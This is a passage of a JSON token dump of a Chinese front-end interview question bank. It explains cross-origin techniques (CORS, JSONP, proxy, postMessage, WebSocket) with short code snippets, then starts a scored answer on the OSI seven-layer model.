什么是跨域：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求\\n+ 同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求\\n","task":false,"loose":false,"text":"浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求","tokens":[{"type":"text","raw":"浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求","text":"浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求","tokens":[{"type":"text","raw":"浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求","text":"浏览器的同源策略限制，不同源（协议、域名、端口）之间的请求被视为跨域请求","escaped":false}]}]},{"type":"list_item","raw":"+ 同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","task":false,"loose":false,"text":"同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","tokens":[{"type":"text","raw":"同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","text":"同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","tokens":[{"type":"text","raw":"同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","text":"同源策略是浏览器的一个重要的安全机制，防止恶意网站窃取数据","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** CORS（跨域资源共享）：\\n\\n  + 使用场景：现代浏览器的首选跨域解决方案，适用于REST API\\n  + 优点：支持所有类型的HTTP请求，配置灵活\\n  + 缺点：需要服务器配合，老版本浏览器可能不支持","task":false,"loose":true,"text":"**1：** CORS（跨域资源共享）：\\n\\n+ 使用场景：现代浏览器的首选跨域解决方案，适用于REST API\\n+ 优点：支持所有类型的HTTP请求，配置灵活\\n+ 缺点：需要服务器配合，老版本浏览器可能不支持","tokens":[{"type":"text","raw":"**1：** CORS（跨域资源共享）：","text":"**1：** CORS（跨域资源共享）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CORS（跨域资源共享）：","text":" CORS（跨域资源共享）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 使用场景：现代浏览器的首选跨域解决方案，适用于REST API\\n+ 优点：支持所有类型的HTTP请求，配置灵活\\n+ 缺点：需要服务器配合，老版本浏览器可能不支持","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用场景：现代浏览器的首选跨域解决方案，适用于REST API\\n","task":false,"loose":false,"text":"使用场景：现代浏览器的首选跨域解决方案，适用于REST API","tokens":[{"type":"text","raw":"使用场景：现代浏览器的首选跨域解决方案，适用于REST API","text":"使用场景：现代浏览器的首选跨域解决方案，适用于REST API","tokens":[{"type":"text","raw":"使用场景：现代浏览器的首选跨域解决方案，适用于REST API","text":"使用场景：现代浏览器的首选跨域解决方案，适用于REST API","escaped":false}]}]},{"type":"list_item","raw":"+ 优点：支持所有类型的HTTP请求，配置灵活\\n","task":false,"loose":false,"text":"优点：支持所有类型的HTTP请求，配置灵活","tokens":[{"type":"text","raw":"优点：支持所有类型的HTTP请求，配置灵活","text":"优点：支持所有类型的HTTP请求，配置灵活","tokens":[{"type":"text","raw":"优点：支持所有类型的HTTP请求，配置灵活","text":"优点：支持所有类型的HTTP请求，配置灵活","escaped":false}]}]},{"type":"list_item","raw":"+ 缺点：需要服务器配合，老版本浏览器可能不支持","task":false,"loose":false,"text":"缺点：需要服务器配合，老版本浏览器可能不支持","tokens":[{"type":"text","raw":"缺点：需要服务器配合，老版本浏览器可能不支持","text":"缺点：需要服务器配合，老版本浏览器可能不支持","tokens":[{"type":"text","raw":"缺点：需要服务器配合，老版本浏览器可能不支持","text":"缺点：需要服务器配合，老版本浏览器可能不支持","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n// 服务器端设置\\napp.use((req, res, next) => {\\n  res.header(\'Access-Control-Allow-Origin\', \'*\');\\n  res.header(\'Access-Control-Allow-Methods\', \'GET,PUT,POST,DELETE\');\\n  res.header(\'Access-Control-Allow-Headers\', \'Content-Type\');\\n  next();\\n});\\n```","lang":"javascript","text":"// 服务器端设置\\napp.use((req, res, next) => {\\n  res.header(\'Access-Control-Allow-Origin\', \'*\');\\n  res.header(\'Access-Control-Allow-Methods\', \'GET,PUT,POST,DELETE\');\\n  res.header(\'Access-Control-Allow-Headers\', \'Content-Type\');\\n  next();\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** JSONP：\\n  + 使用场景：兼容老版本浏览器，只需要GET请求的场景\\n  + 优点：兼容性好，实现简单\\n  + 缺点：只支持GET请求，可能存在安全问题","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** JSONP：\\n  + 使用场景：兼容老版本浏览器，只需要GET请求的场景\\n  + 优点：兼容性好，实现简单\\n  + 缺点：只支持GET请求，可能存在安全问题","task":false,"loose":false,"text":"**1：** JSONP：\\n+ 使用场景：兼容老版本浏览器，只需要GET请求的场景\\n+ 优点：兼容性好，实现简单\\n+ 缺点：只支持GET请求，可能存在安全问题","tokens":[{"type":"text","raw":"**1：** JSONP：\\n","text":"**1：** JSONP：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JSONP：","text":" JSONP：","escaped":false}]},{"type":"list","raw":"+ 使用场景：兼容老版本浏览器，只需要GET请求的场景\\n+ 优点：兼容性好，实现简单\\n+ 缺点：只支持GET请求，可能存在安全问题","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用场景：兼容老版本浏览器，只需要GET请求的场景\\n","task":false,"loose":false,"text":"使用场景：兼容老版本浏览器，只需要GET请求的场景","tokens":[{"type":"text","raw":"使用场景：兼容老版本浏览器，只需要GET请求的场景","text":"使用场景：兼容老版本浏览器，只需要GET请求的场景","tokens":[{"type":"text","raw":"使用场景：兼容老版本浏览器，只需要GET请求的场景","text":"使用场景：兼容老版本浏览器，只需要GET请求的场景","escaped":false}]}]},{"type":"list_item","raw":"+ 优点：兼容性好，实现简单\\n","task":false,"loose":false,"text":"优点：兼容性好，实现简单","tokens":[{"type":"text","raw":"优点：兼容性好，实现简单","text":"优点：兼容性好，实现简单","tokens":[{"type":"text","raw":"优点：兼容性好，实现简单","text":"优点：兼容性好，实现简单","escaped":false}]}]},{"type":"list_item","raw":"+ 缺点：只支持GET请求，可能存在安全问题","task":false,"loose":false,"text":"缺点：只支持GET请求，可能存在安全问题","tokens":[{"type":"text","raw":"缺点：只支持GET请求，可能存在安全问题","text":"缺点：只支持GET请求，可能存在安全问题","tokens":[{"type":"text","raw":"缺点：只支持GET请求，可能存在安全问题","text":"缺点：只支持GET请求，可能存在安全问题","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nfunction jsonp(url, callback) {\\n  const script = document.createElement(\'script\');\\n  script.src = `${url}?callback=${callback}`;\\n  document.body.appendChild(script);\\n}\\n```","lang":"javascript","text":"function jsonp(url, callback) {\\n  const script = document.createElement(\'script\');\\n  script.src = `${url}?callback=${callback}`;\\n  document.body.appendChild(script);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 代理服务器：\\n  + 使用场景：需要隐藏跨域细节，适合生产环境\\n  + 优点：可以集中处理跨域问题，对前端透明\\n  + 缺点：需要额外的服务器配置和维护","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 代理服务器：\\n  + 使用场景：需要隐藏跨域细节，适合生产环境\\n  + 优点：可以集中处理跨域问题，对前端透明\\n  + 缺点：需要额外的服务器配置和维护","task":false,"loose":false,"text":"**1：** 代理服务器：\\n+ 使用场景：需要隐藏跨域细节，适合生产环境\\n+ 优点：可以集中处理跨域问题，对前端透明\\n+ 缺点：需要额外的服务器配置和维护","tokens":[{"type":"text","raw":"**1：** 代理服务器：\\n","text":"**1：** 代理服务器：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代理服务器：","text":" 代理服务器：","escaped":false}]},{"type":"list","raw":"+ 使用场景：需要隐藏跨域细节，适合生产环境\\n+ 优点：可以集中处理跨域问题，对前端透明\\n+ 缺点：需要额外的服务器配置和维护","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用场景：需要隐藏跨域细节，适合生产环境\\n","task":false,"loose":false,"text":"使用场景：需要隐藏跨域细节，适合生产环境","tokens":[{"type":"text","raw":"使用场景：需要隐藏跨域细节，适合生产环境","text":"使用场景：需要隐藏跨域细节，适合生产环境","tokens":[{"type":"text","raw":"使用场景：需要隐藏跨域细节，适合生产环境","text":"使用场景：需要隐藏跨域细节，适合生产环境","escaped":false}]}]},{"type":"list_item","raw":"+ 优点：可以集中处理跨域问题，对前端透明\\n","task":false,"loose":false,"text":"优点：可以集中处理跨域问题，对前端透明","tokens":[{"type":"text","raw":"优点：可以集中处理跨域问题，对前端透明","text":"优点：可以集中处理跨域问题，对前端透明","tokens":[{"type":"text","raw":"优点：可以集中处理跨域问题，对前端透明","text":"优点：可以集中处理跨域问题，对前端透明","escaped":false}]}]},{"type":"list_item","raw":"+ 缺点：需要额外的服务器配置和维护","task":false,"loose":false,"text":"缺点：需要额外的服务器配置和维护","tokens":[{"type":"text","raw":"缺点：需要额外的服务器配置和维护","text":"缺点：需要额外的服务器配置和维护","tokens":[{"type":"text","raw":"缺点：需要额外的服务器配置和维护","text":"缺点：需要额外的服务器配置和维护","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n// nginx配置示例\\nlocation /api {\\n  proxy_pass http://backend-server;\\n  proxy_set_header Host $host;\\n  proxy_set_header X-Real-IP $remote_addr;\\n}\\n```","lang":"javascript","text":"// nginx配置示例\\nlocation /api {\\n  proxy_pass http://backend-server;\\n  proxy_set_header Host $host;\\n  proxy_set_header X-Real-IP $remote_addr;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** postMessage：\\n  + 使用场景：iframe跨域通信，不同标签页通信\\n  + 优点：可以实现跨窗口通信，安全性好\\n  + 缺点：使用相对复杂，需要双方页面都进行相应处理","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** postMessage：\\n  + 使用场景：iframe跨域通信，不同标签页通信\\n  + 优点：可以实现跨窗口通信，安全性好\\n  + 缺点：使用相对复杂，需要双方页面都进行相应处理","task":false,"loose":false,"text":"**1：** postMessage：\\n+ 使用场景：iframe跨域通信，不同标签页通信\\n+ 优点：可以实现跨窗口通信，安全性好\\n+ 缺点：使用相对复杂，需要双方页面都进行相应处理","tokens":[{"type":"text","raw":"**1：** postMessage：\\n","text":"**1：** postMessage：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" postMessage：","text":" postMessage：","escaped":false}]},{"type":"list","raw":"+ 使用场景：iframe跨域通信，不同标签页通信\\n+ 优点：可以实现跨窗口通信，安全性好\\n+ 缺点：使用相对复杂，需要双方页面都进行相应处理","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用场景：iframe跨域通信，不同标签页通信\\n","task":false,"loose":false,"text":"使用场景：iframe跨域通信，不同标签页通信","tokens":[{"type":"text","raw":"使用场景：iframe跨域通信，不同标签页通信","text":"使用场景：iframe跨域通信，不同标签页通信","tokens":[{"type":"text","raw":"使用场景：iframe跨域通信，不同标签页通信","text":"使用场景：iframe跨域通信，不同标签页通信","escaped":false}]}]},{"type":"list_item","raw":"+ 优点：可以实现跨窗口通信，安全性好\\n","task":false,"loose":false,"text":"优点：可以实现跨窗口通信，安全性好","tokens":[{"type":"text","raw":"优点：可以实现跨窗口通信，安全性好","text":"优点：可以实现跨窗口通信，安全性好","tokens":[{"type":"text","raw":"优点：可以实现跨窗口通信，安全性好","text":"优点：可以实现跨窗口通信，安全性好","escaped":false}]}]},{"type":"list_item","raw":"+ 缺点：使用相对复杂，需要双方页面都进行相应处理","task":false,"loose":false,"text":"缺点：使用相对复杂，需要双方页面都进行相应处理","tokens":[{"type":"text","raw":"缺点：使用相对复杂，需要双方页面都进行相应处理","text":"缺点：使用相对复杂，需要双方页面都进行相应处理","tokens":[{"type":"text","raw":"缺点：使用相对复杂，需要双方页面都进行相应处理","text":"缺点：使用相对复杂，需要双方页面都进行相应处理","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n// 发送消息\\nwindow.postMessage(\'Hello\', \'http://receiver.com\');\\n\\n// 接收消息\\nwindow.addEventListener(\'message\', (event) => {\\n  if (event.origin !== \'http://sender.com\') return;\\n  console.log(event.data);\\n});\\n```","lang":"javascript","text":"// 发送消息\\nwindow.postMessage(\'Hello\', \'http://receiver.com\');\\n\\n// 接收消息\\nwindow.addEventListener(\'message\', (event) => {\\n  if (event.origin !== \'http://sender.com\') return;\\n  console.log(event.data);\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** WebSocket：\\n  + 使用场景：需要实时双向通信的场景\\n  + 优点：支持全双工通信，没有跨域限制\\n  + 缺点：需要专门的服务器支持，协议和HTTP不同","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** WebSocket：\\n  + 使用场景：需要实时双向通信的场景\\n  + 优点：支持全双工通信，没有跨域限制\\n  + 缺点：需要专门的服务器支持，协议和HTTP不同","task":false,"loose":false,"text":"**1：** WebSocket：\\n+ 使用场景：需要实时双向通信的场景\\n+ 优点：支持全双工通信，没有跨域限制\\n+ 缺点：需要专门的服务器支持，协议和HTTP不同","tokens":[{"type":"text","raw":"**1：** WebSocket：\\n","text":"**1：** WebSocket：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" WebSocket：","text":" WebSocket：","escaped":false}]},{"type":"list","raw":"+ 使用场景：需要实时双向通信的场景\\n+ 优点：支持全双工通信，没有跨域限制\\n+ 缺点：需要专门的服务器支持，协议和HTTP不同","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用场景：需要实时双向通信的场景\\n","task":false,"loose":false,"text":"使用场景：需要实时双向通信的场景","tokens":[{"type":"text","raw":"使用场景：需要实时双向通信的场景","text":"使用场景：需要实时双向通信的场景","tokens":[{"type":"text","raw":"使用场景：需要实时双向通信的场景","text":"使用场景：需要实时双向通信的场景","escaped":false}]}]},{"type":"list_item","raw":"+ 优点：支持全双工通信，没有跨域限制\\n","task":false,"loose":false,"text":"优点：支持全双工通信，没有跨域限制","tokens":[{"type":"text","raw":"优点：支持全双工通信，没有跨域限制","text":"优点：支持全双工通信，没有跨域限制","tokens":[{"type":"text","raw":"优点：支持全双工通信，没有跨域限制","text":"优点：支持全双工通信，没有跨域限制","escaped":false}]}]},{"type":"list_item","raw":"+ 缺点：需要专门的服务器支持，协议和HTTP不同","task":false,"loose":false,"text":"缺点：需要专门的服务器支持，协议和HTTP不同","tokens":[{"type":"text","raw":"缺点：需要专门的服务器支持，协议和HTTP不同","text":"缺点：需要专门的服务器支持，协议和HTTP不同","tokens":[{"type":"text","raw":"缺点：需要专门的服务器支持，协议和HTTP不同","text":"缺点：需要专门的服务器支持，协议和HTTP不同","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst ws = new WebSocket(\'ws://example.com\');\\nws.onmessage = (event) => {\\n  console.log(event.data);\\n};\\n```","lang":"javascript","text":"const ws = new WebSocket(\'ws://example.com\');\\nws.onmessage = (event) => {\\n  console.log(event.data);\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## OSI七层模型是什么？\\n\\n","depth":2,"text":"OSI七层模型是什么？","tokens":[{"type":"text","raw":"OSI七层模型是什么？","text":"OSI七层模型是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"- **1：** 应用层（第7层）：\\n\\n  + 为应用程序提供网络服务\\n  + 协议：HTTP、FTP、SMTP等\\n  + 数据单位：消息\\n- **1：** 表示层（第6层）：\\n\\n  + 数据格式转换、加密解密\\n  + 确保数据可以被接收方理解\\n  + 数据单位：消息\\n- **1：** 会话层（第5层）：\\n\\n  + 建立、管理和终止会话\\n  + 提供对话控制\\n  + 数据单位：消息\\n- **1：** 传输层（第4层）：\\n\\n  + 端到端的可靠数据传输\\n  + 协议：TCP、UDP\\n  + 数据单位：段（TCP）、数据报（UDP）\\n- **1：** 网络层（第3层）：\\n\\n  + 负责数据包的路由和转发\\n  + 协议：IP、ICMP\\n  + 数据单位：数据包\\n- **1：** 数据链路层（第2层）：\\n\\n  + 相邻节点之间的数据传输\\n  + 差错检测和纠正\\n  + 数据单位：帧\\n- **1：** 物理层（第1层）：\\n\\n  + 比特流的传输\\n  + 定义物理媒介、接口和电气特性\\n  + 数据单位：比特\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 应用层（第7层）：\\n\\n  + 为应用程序提供网络服务\\n  + 协议：HTTP、FTP、SMTP等\\n  + 数据单位：消息\\n","task":false,"loose":true,"text":"**1：** 应用层（第7层）：\\n\\n+ 为应用程序提供网络服务\\n+ 协议：HTTP、FTP、SMTP等\\n+ 数据单位：消息","tokens":[{"type":"text","raw":"**1：** 应用层（第7层）：","text":"**1：** 应用层（第7层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 应用层（第7层）：","text":" 应用层（第7层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 为应用程序提供网络服务\\n+ 协议：HTTP、FTP、SMTP等\\n+ 数据单位：消息","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 为应用程序提供网络服务\\n","task":false,"loose":false,"text":"为应用程序提供网络服务","tokens":[{"type":"text","raw":"为应用程序提供网络服务","text":"为应用程序提供网络服务","tokens":[{"type":"text","raw":"为应用程序提供网络服务","text":"为应用程序提供网络服务","escaped":false}]}]},{"type":"list_item","raw":"+ 协议：HTTP、FTP、SMTP等\\n","task":false,"loose":false,"text":"协议：HTTP、FTP、SMTP等","tokens":[{"type":"text","raw":"协议：HTTP、FTP、SMTP等","text":"协议：HTTP、FTP、SMTP等","tokens":[{"type":"text","raw":"协议：HTTP、FTP、SMTP等","text":"协议：HTTP、FTP、SMTP等","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：消息","task":false,"loose":false,"text":"数据单位：消息","tokens":[{"type":"text","raw":"数据单位：消息","text":"数据单位：消息","tokens":[{"type":"text","raw":"数据单位：消息","text":"数据单位：消息","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 表示层（第6层）：\\n\\n  + 数据格式转换、加密解密\\n  + 确保数据可以被接收方理解\\n  + 数据单位：消息\\n","task":false,"loose":true,"text":"**1：** 表示层（第6层）：\\n\\n+ 数据格式转换、加密解密\\n+ 确保数据可以被接收方理解\\n+ 数据单位：消息","tokens":[{"type":"text","raw":"**1：** 表示层（第6层）：","text":"**1：** 表示层（第6层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 表示层（第6层）：","text":" 表示层（第6层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 数据格式转换、加密解密\\n+ 确保数据可以被接收方理解\\n+ 数据单位：消息","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 数据格式转换、加密解密\\n","task":false,"loose":false,"text":"数据格式转换、加密解密","tokens":[{"type":"text","raw":"数据格式转换、加密解密","text":"数据格式转换、加密解密","tokens":[{"type":"text","raw":"数据格式转换、加密解密","text":"数据格式转换、加密解密","escaped":false}]}]},{"type":"list_item","raw":"+ 确保数据可以被接收方理解\\n","task":false,"loose":false,"text":"确保数据可以被接收方理解","tokens":[{"type":"text","raw":"确保数据可以被接收方理解","text":"确保数据可以被接收方理解","tokens":[{"type":"text","raw":"确保数据可以被接收方理解","text":"确保数据可以被接收方理解","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：消息","task":false,"loose":false,"text":"数据单位：消息","tokens":[{"type":"text","raw":"数据单位：消息","text":"数据单位：消息","tokens":[{"type":"text","raw":"数据单位：消息","text":"数据单位：消息","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 会话层（第5层）：\\n\\n  + 建立、管理和终止会话\\n  + 提供对话控制\\n  + 数据单位：消息\\n","task":false,"loose":true,"text":"**1：** 会话层（第5层）：\\n\\n+ 建立、管理和终止会话\\n+ 提供对话控制\\n+ 数据单位：消息","tokens":[{"type":"text","raw":"**1：** 会话层（第5层）：","text":"**1：** 会话层（第5层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 会话层（第5层）：","text":" 会话层（第5层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 建立、管理和终止会话\\n+ 提供对话控制\\n+ 数据单位：消息","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 建立、管理和终止会话\\n","task":false,"loose":false,"text":"建立、管理和终止会话","tokens":[{"type":"text","raw":"建立、管理和终止会话","text":"建立、管理和终止会话","tokens":[{"type":"text","raw":"建立、管理和终止会话","text":"建立、管理和终止会话","escaped":false}]}]},{"type":"list_item","raw":"+ 提供对话控制\\n","task":false,"loose":false,"text":"提供对话控制","tokens":[{"type":"text","raw":"提供对话控制","text":"提供对话控制","tokens":[{"type":"text","raw":"提供对话控制","text":"提供对话控制","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：消息","task":false,"loose":false,"text":"数据单位：消息","tokens":[{"type":"text","raw":"数据单位：消息","text":"数据单位：消息","tokens":[{"type":"text","raw":"数据单位：消息","text":"数据单位：消息","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 传输层（第4层）：\\n\\n  + 端到端的可靠数据传输\\n  + 协议：TCP、UDP\\n  + 数据单位：段（TCP）、数据报（UDP）\\n","task":false,"loose":true,"text":"**1：** 传输层（第4层）：\\n\\n+ 端到端的可靠数据传输\\n+ 协议：TCP、UDP\\n+ 数据单位：段（TCP）、数据报（UDP）","tokens":[{"type":"text","raw":"**1：** 传输层（第4层）：","text":"**1：** 传输层（第4层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 传输层（第4层）：","text":" 传输层（第4层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 端到端的可靠数据传输\\n+ 协议：TCP、UDP\\n+ 数据单位：段（TCP）、数据报（UDP）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 端到端的可靠数据传输\\n","task":false,"loose":false,"text":"端到端的可靠数据传输","tokens":[{"type":"text","raw":"端到端的可靠数据传输","text":"端到端的可靠数据传输","tokens":[{"type":"text","raw":"端到端的可靠数据传输","text":"端到端的可靠数据传输","escaped":false}]}]},{"type":"list_item","raw":"+ 协议：TCP、UDP\\n","task":false,"loose":false,"text":"协议：TCP、UDP","tokens":[{"type":"text","raw":"协议：TCP、UDP","text":"协议：TCP、UDP","tokens":[{"type":"text","raw":"协议：TCP、UDP","text":"协议：TCP、UDP","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：段（TCP）、数据报（UDP）","task":false,"loose":false,"text":"数据单位：段（TCP）、数据报（UDP）","tokens":[{"type":"text","raw":"数据单位：段（TCP）、数据报（UDP）","text":"数据单位：段（TCP）、数据报（UDP）","tokens":[{"type":"text","raw":"数据单位：段（TCP）、数据报（UDP）","text":"数据单位：段（TCP）、数据报（UDP）","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 网络层（第3层）：\\n\\n  + 负责数据包的路由和转发\\n  + 协议：IP、ICMP\\n  + 数据单位：数据包\\n","task":false,"loose":true,"text":"**1：** 网络层（第3层）：\\n\\n+ 负责数据包的路由和转发\\n+ 协议：IP、ICMP\\n+ 数据单位：数据包","tokens":[{"type":"text","raw":"**1：** 网络层（第3层）：","text":"**1：** 网络层（第3层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 网络层（第3层）：","text":" 网络层（第3层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 负责数据包的路由和转发\\n+ 协议：IP、ICMP\\n+ 数据单位：数据包","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 负责数据包的路由和转发\\n","task":false,"loose":false,"text":"负责数据包的路由和转发","tokens":[{"type":"text","raw":"负责数据包的路由和转发","text":"负责数据包的路由和转发","tokens":[{"type":"text","raw":"负责数据包的路由和转发","text":"负责数据包的路由和转发","escaped":false}]}]},{"type":"list_item","raw":"+ 协议：IP、ICMP\\n","task":false,"loose":false,"text":"协议：IP、ICMP","tokens":[{"type":"text","raw":"协议：IP、ICMP","text":"协议：IP、ICMP","tokens":[{"type":"text","raw":"协议：IP、ICMP","text":"协议：IP、ICMP","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：数据包","task":false,"loose":false,"text":"数据单位：数据包","tokens":[{"type":"text","raw":"数据单位：数据包","text":"数据单位：数据包","tokens":[{"type":"text","raw":"数据单位：数据包","text":"数据单位：数据包","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 数据链路层（第2层）：\\n\\n  + 相邻节点之间的数据传输\\n  + 差错检测和纠正\\n  + 数据单位：帧\\n","task":false,"loose":true,"text":"**1：** 数据链路层（第2层）：\\n\\n+ 相邻节点之间的数据传输\\n+ 差错检测和纠正\\n+ 数据单位：帧","tokens":[{"type":"text","raw":"**1：** 数据链路层（第2层）：","text":"**1：** 数据链路层（第2层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据链路层（第2层）：","text":" 数据链路层（第2层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 相邻节点之间的数据传输\\n+ 差错检测和纠正\\n+ 数据单位：帧","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 相邻节点之间的数据传输\\n","task":false,"loose":false,"text":"相邻节点之间的数据传输","tokens":[{"type":"text","raw":"相邻节点之间的数据传输","text":"相邻节点之间的数据传输","tokens":[{"type":"text","raw":"相邻节点之间的数据传输","text":"相邻节点之间的数据传输","escaped":false}]}]},{"type":"list_item","raw":"+ 差错检测和纠正\\n","task":false,"loose":false,"text":"差错检测和纠正","tokens":[{"type":"text","raw":"差错检测和纠正","text":"差错检测和纠正","tokens":[{"type":"text","raw":"差错检测和纠正","text":"差错检测和纠正","escaped":false}]}]},{"type":"list_item","raw":"+ 数据单位：帧","task":false,"loose":false,"text":"数据单位：帧","tokens":[{"type":"text","raw":"数据单位：帧","text":"数据单位：帧","tokens":[{"type":"text","raw":"数据单位：帧","text":"数据单位：帧","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 物理层（第1层）：\\n\\n  + 比特流的传输\\n  + 定义物理媒介、接口和电气特性\\n  + 数据单位：比特","task":false,"loose":true,"text":"**1：** 物理层（第1层）：\\n\\n+ 比特流的传输\\n+ 定义物理媒介、接口和电气特性\\n+ 数据单位：比特","tokens":[{"type":"text","raw":"**1：** 物理层（第1层）：","text":"**1：** 物理层（第1层）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 物理层（第1层）：","text":" 物理层（第1层）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ 比特流的传输\\n+ 定义物理媒介、接口和电气特性\\n+ 数据单位：比特","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 